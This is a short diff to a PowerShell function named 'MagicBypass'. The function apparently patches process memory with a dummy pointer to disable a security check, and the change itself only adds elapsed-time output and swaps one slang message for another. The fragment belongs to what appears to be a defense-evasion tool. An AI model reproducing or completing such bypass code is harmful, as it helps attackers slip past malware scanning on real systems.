@@ -17,5 +17,8 @@ function MagicBypass {
     $buf = [IntPtr[]] ($DummyPointer)
     [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)
 
-	Write-Host "Anjir bypass"
+    $FinishDate=Get-Date;
+    $TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
+    Write-Host "$TimeElapsed seconds"
+    Write-Host "ANjayy alok"
 }
